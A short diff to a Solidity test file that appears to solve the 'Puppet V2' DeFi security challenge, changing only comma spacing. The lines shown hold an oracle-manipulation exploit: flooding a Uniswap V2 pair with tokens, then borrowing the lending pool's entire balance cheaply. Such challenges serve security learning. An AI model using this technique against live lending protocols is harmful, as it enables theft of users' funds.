@@ -103,9 +103,9 @@ contract PuppetV2Challenge is Test {
         token.transfer(address(uniswapV2Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
         weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
         uniswapV2Exchange.swap(9.9 ether, 0, address(player), "");
-        weth.approve(address(lendingPool),POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
         lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
-        token.transfer(recovery,POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
